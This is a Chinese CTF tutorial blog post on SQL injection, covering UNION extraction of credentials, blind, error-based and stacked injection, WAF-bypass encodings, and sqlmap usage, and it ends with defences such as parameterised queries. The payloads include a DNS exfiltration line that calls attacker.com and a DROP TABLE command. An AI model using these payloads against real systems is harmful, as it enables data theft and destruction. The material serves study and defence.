---
title: CTF Web：SQL 注入从入门到绕过 WAF
date: 2026-09-12 16:00:00
categories: [CTF, Web安全]
tags: [CTF, Web, SQL注入, WAF绕过, 安全]
cover: /img/bg10.jpg
---

## SQL 注入是什么

SQL 注入（SQL Injection）是 Web 安全中最经典、最持久的漏洞类型。当应用程序把用户输入直接拼接到 SQL 查询语句中，而没有做正确的过滤或参数化处理时，攻击者就可以通过构造恶意输入来篡改 SQL 语句的逻辑，从而读取、修改、删除数据库中的数据，甚至在某些情况下获取服务器权限。

一个最基础的例子：

```php
// 存在漏洞的代码
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = $id";
$result = mysqli_query($conn, $sql);
```

当用户访问 `?id=1` 时，执行的 SQL 是：
```sql
SELECT * FROM users WHERE id = 1
```

当用户访问 `?id=1 OR 1=1` 时，执行的 SQL 变成：
```sql
SELECT * FROM users WHERE id = 1 OR 1=1
```

`1=1` 恒为真，查询会返回 users 表中的所有记录——这就是最基础的 SQL 注入。

<!-- more -->

## 注入点分类

### 按注入位置分

- **GET 注入**：参数在 URL 中，如 `?id=1`
- **POST 注入**：参数在请求体中，如登录表单
- **Cookie 注入**：参数在 Cookie 中
- **HTTP 头注入**：User-Agent、X-Forwarded-For、Referer 等头字段
- **二阶注入**：注入 payload 先存入数据库，后续被另一个查询读取时触发

### 按数据类型分

- **数字型**：`WHERE id = 1`，不需要引号闭合
- **字符型**：`WHERE username = 'admin'`，需要用单引号闭合
- **搜索型**：`WHERE name LIKE '%keyword%'`，需要闭合 `%'`

## 基础注入流程

### 1. 判断注入点

```
?id=1'          # 报错或页面异常 → 可能存在注入
?id=1 and 1=1   # 页面正常
?id=1 and 1=2   # 页面异常 → 确认数字型注入
?id=1' and '1'='1  # 字符型测试
```

### 2. 判断列数（ORDER BY）

```
?id=1 ORDER BY 1--+    # 正常
?id=1 ORDER BY 2--+    # 正常
?id=1 ORDER BY 3--+    # 报错 → 列数为 2
```

### 3. 判断回显位（UNION SELECT）

```
?id=-1 UNION SELECT 1,2--+
```

注意把 id 改成不存在的值（如 -1），这样原查询返回空，UNION 的结果才会显示在页面上。

### 4. 爆数据库

```
?id=-1 UNION SELECT 1,database()--+
```

### 5. 爆表名

```
?id=-1 UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--+
```

### 6. 爆列名

```
?id=-1 UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--+
```

### 7. 爆数据

```
?id=-1 UNION SELECT 1,group_concat(username,0x3a,password) FROM users--+
```

`0x3a` 是冒号 `:` 的十六进制，用来分隔用户名和密码。

## 盲注技术

当页面没有回显位，甚至连报错信息都没有时，就需要用盲注。

### 布尔盲注

根据页面返回的真假（正常/异常）来逐位猜解数据：

```
?id=1 AND LENGTH(database())=8--+   # 猜数据库名长度
?id=1 AND SUBSTR(database(),1,1)='t'--+  # 猜第一个字符
```

用二分法加速：

```
?id=1 AND ASCII(SUBSTR(database(),1,1))>100--+
```

### 时间盲注

当页面连真假都不区分时，用 `SLEEP()` 或 `BENCHMARK()` 根据响应时间判断：

```
?id=1 AND IF(LENGTH(database())=8,SLEEP(5),0)--+
```

如果响应时间超过 5 秒，说明条件成立。

MySQL 时间盲注常用函数：
- `SLEEP(n)`：休眠 n 秒
- `BENCHMARK(n, expr)`：重复执行 expr n 次
- `IF(cond, true, false)`：条件判断

### DNS 外带盲注（OOB）

当布尔和时间盲注都太慢时，可以用 DNS 外带把数据带出来：

```
?id=1 AND LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\test'))--+
```

需要一个可控的 DNS 服务器（如 ceye.io、dnslog.cn）来接收查询。

## 报错注入

当页面显示数据库报错信息时，可以用报错注入把数据带出来。常用的报错函数：

### updatexml / extractvalue

```
?id=1 AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--+
?id=1 AND extractvalue(1,concat(0x7e,(SELECT database())))--+
```

`0x7e` 是 `~`，updatexml 遇到不合法的 XPATH 路径会报错，报错信息中包含我们拼接的数据。

注意：updatexml 最多显示 32 个字符，超过需要用 `SUBSTR` 分段。

### floor 报错

```
?id=1 AND (SELECT 1 FROM (SELECT count(*),concat((SELECT database()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--+
```

原理是 `group by` + `rand()` 在特定条件下会产生主键重复报错。

## 堆叠注入

堆叠注入（Stacked Queries）允许在一条语句后用分号 `;` 拼接另一条完全独立的语句：

```
?id=1; DROP TABLE users--+
```

注意：堆叠注入是否可用取决于数据库驱动。PHP 的 `mysqli_multi_query()` 支持，但 `mysqli_query()` 不支持。Python 的 pymysql 默认也不支持多语句。

堆叠注入常用操作：
- 增删改查：`INSERT INTO users VALUES(...)`
- 修改表结构：`ALTER TABLE users ADD COLUMN passwd VARCHAR(100)`
- 预编译绕过：`SET @sql=concat('SEL','ECT ...'); PREPARE stmt FROM @sql; EXECUTE stmt;`

## WAF 绕过技术

### 1. 大小写绕过

```
?id=1 UnIoN SeLeCt 1,2--+
```

WAF 用正则匹配 `union select` 时，大小写混合可以绕过（MySQL 不区分关键字大小写）。

### 2. 注释绕过

```
?id=1 UNION/**/SELECT/**/1,2--+
?id=1 UNION/*xxx*/SELECT/*xxx*/1,2--+
```

用注释符替换空格。

### 3. 编码绕过

- URL 编码：`%20` 代替空格，`%27` 代替单引号
- 双重 URL 编码：`%2527`（有些 WAF 只解码一次）
- Unicode 编码：`%u0027`
- 十六进制：字符串用 `0x61646d696e` 代替 `'admin'`

### 4. 等价函数绕过

| 被过滤 | 替代方案 |
|--------|----------|
| `空格` | `/**/`、`%09`(tab)、`%0a`(换行)、`%0c`(换页)、`%0d`(回车)、括号 |
| `=` | `LIKE`、`REGEXP`、`>`、`<`、`!=` |
| `AND` | `&&` |
| `OR` | `||` |
| `UNION SELECT` | `UNION ALL SELECT` |
| `SUBSTR` | `MID`、`SUBSTRING`、`LEFT` |
| `DATABASE()` | `SCHEMA()` |
| `GROUP_CONCAT` | `CONCAT_WS` |
| `SLEEP()` | `BENCHMARK()` |
| `information_schema` | `sys.schema_auto_increment_columns`、`mysql.innodb_table_stats` |

### 5. 内联注释绕过

```
?id=1 /*!UNION*/ /*!SELECT*/ 1,2--+
```

MySQL 的内联注释 `/*! ... */` 中的内容会被 MySQL 执行，但其他数据库会忽略。有些 WAF 不识别这种语法。

还可以带版本号：
```
?id=1 /*!50000UNION*/ /*!50000SELECT*/ 1,2--+
```
`/*!50000 ... */` 表示 MySQL 版本 >= 5.00.00 时才执行。

### 6. 预编译绕过

当关键字被过滤时，用字符串拼接 + 预编译执行：

```
?id=1; SET @sql=concat('SEL','ECT * FROM users'); PREPARE stmt FROM @sql; EXECUTE stmt;--+
```

也可以用十六进制：
```
?id=1; SET @sql=0x53454c454354202a2046524f4d207573657273; PREPARE stmt FROM @sql; EXECUTE stmt;--+
```

### 7. 异或注入

```
?id=1'^0--+
```

`^` 是异或运算符，可以用来绕过对 `and`、`or` 的过滤。

### 8. 注入点在 HTTP 头

有些 WAF 只检查 GET/POST 参数，不检查 HTTP 头：

```
User-Agent: 1' UNION SELECT 1,2--+
X-Forwarded-For: 1' UNION SELECT 1,2--+
Referer: 1' UNION SELECT 1,2--+
```

常见于日志记录功能把 HTTP 头存入数据库的场景。

## 各数据库注入差异

### MySQL

- 注释：`-- `、`#`、`/**/`
- 系统库：`information_schema`
- 时间盲注：`SLEEP()`、`BENCHMARK()`
- 报错注入：`updatexml()`、`extractvalue()`、`floor()`
- 堆叠注入：取决于驱动
- 读文件：`LOAD_FILE()`
- 写文件：`INTO OUTFILE`、`INTO DUMPFILE`

### MSSQL

- 注释：`--`、`/**/`
- 系统表：`sysobjects`、`syscolumns`
- 时间盲注：`WAITFOR DELAY '0:0:5'`
- 报错注入：`convert()`、`@@version`
- 堆叠注入：默认支持
- 提权：`xp_cmdshell`

### Oracle

- 注释：`--`、`/**/`
- 系统表：`all_tables`、`user_tables`、`dual`
- 时间盲注：`DBMS_LOCK.SLEEP()`
- 报错注入：`utl_inaddr`、`ctxsys.drithsx.sn`
- 必须用 `FROM dual` 才能 SELECT 常量
- 不支持 `LIMIT`，用 `ROWNUM`

### PostgreSQL

- 注释：`--`、`/**/`
- 系统表：`information_schema.tables`
- 时间盲注：`pg_sleep()`
- 报错注入：`CAST()` 类型转换错误
- 堆叠注入：默认支持
- 可执行系统命令（高权限时）

## 高级注入技巧

### 宽字节注入

当数据库使用 GBK 编码，且 PHP 用 `addslashes()` 或 `magic_quotes_gpc` 转义单引号时：

```
?id=1%df' UNION SELECT 1,2--+
```

`%df` 和转义后的 `\'`（`%5c%27`）中的 `%5c` 组合成 GBK 字符 `運`，单引号 `%27` 逃逸出来，闭合成功。

### 二次注入

1. 第一步：注册用户，用户名为 `admin'--`，恶意 payload 被存入数据库
2. 第二步：登录该用户，应用从数据库读取用户名并拼接到 SQL 中，payload 触发

二次注入的难点在于找到数据从输入到数据库再到查询的完整链路。

### 无列名注入

当 `information_schema` 被过滤，无法获取列名时：

```
# 用 JOIN 爆列名
?id=-1 UNION SELECT * FROM (SELECT * FROM users a JOIN users b)c--+

# 用数字代替列名
?id=-1 UNION SELECT `1`,`2` FROM (SELECT 1,2 UNION SELECT * FROM users)a--+
```

### 无列名盲注

```
?id=1 AND (SELECT * FROM users LIMIT 1) > ('admin','x')--+
```

用整行比较来逐位猜解数据，不需要知道列名。

## SQLMap 使用技巧

sqlmap 是自动化 SQL 注入工具，但 CTF 中很多题需要手动调整参数。

### 基础用法

```bash
# 检测注入
sqlmap -u "http://target.com/?id=1"

# 获取数据库
sqlmap -u "http://target.com/?id=1" --dbs

# 获取表
sqlmap -u "http://target.com/?id=1" -D database_name --tables

# 获取列
sqlmap -u "http://target.com/?id=1" -D database_name -T table_name --columns

# dump 数据
sqlmap -u "http://target.com/?id=1" -D database_name -T table_name --dump
```

### 常用参数

```bash
--batch              # 自动确认所有提示
--level=5            # 测试级别 1-5，越高测试越全面
--risk=3             # 风险等级 1-3，越高越可能用危险 payload
--threads=10         # 多线程
--tamper=space2comment  # 使用绕过脚本
--proxy=http://127.0.0.1:8080  # 走代理
--random-agent       # 随机 User-Agent
--delay=1            # 请求延迟 1 秒
--time-sec=5         # 时间盲注的超时时间
```

### 常用 tamper 脚本

- `space2comment`：空格替换为 `/**/`
- `space2hash`：空格替换为 `#`+换行
- `charencode`：URL 编码
- `chardoubleencode`：双重 URL 编码
- `unmagicquotes`：宽字节注入
- `between`：用 `BETWEEN` 代替 `=`
- `randomcase`：随机大小写
- `comment`：在关键字中插入注释
- `equaltolike`：`=` 替换为 `LIKE`
- `ifnull2ifisnull`：`IFNULL` 替换为 `IF IS NULL`

多个 tamper 用逗号分隔：`--tamper=space2comment,randomcase,charencode`

## 防御方案

### 1. 参数化查询（预编译）

最根本的防御，把 SQL 语句结构和数据分开：

```python
# 正确做法
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# 错误做法
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
```

### 2. 输入验证与过滤

- 白名单校验：数字型参数只允许数字
- 长度限制
- 类型检查

### 3. 最小权限原则

数据库账号只授予必要的权限，不要用 root 跑应用。禁止 `FILE`、`SUPER` 等危险权限。

### 4. WAF

部署 Web 应用防火墙作为纵深防御的一层，但不要依赖 WAF 作为唯一防御——WAF 可以被绕过，参数化查询才是根本。

### 5. 错误信息不回显

生产环境关闭详细错误信息，避免泄露数据库结构和注入点信息。

## 总结

SQL 注入从 1998 年被首次公开到现在，已经存在了近 30 年，至今仍然在 OWASP Top 10 中名列前茅。它的变种层出不穷——从基础的 UNION 注入到盲注、报错注入、堆叠注入、二阶注入，再到各种 WAF 绕过技巧。

掌握 SQL 注入的核心在于理解 SQL 语句的结构和数据库的特性。当你能在脑子里把用户输入拼接到 SQL 语句中，想象出最终执行的语句是什么样子时，注入点和绕过方法自然就浮现出来了。

CTF 中的 SQL 注入题通常会组合多种过滤和绕过技巧，需要耐心测试。建议从基础题开始刷，逐步积累对各种数据库和绕过手法的手感。
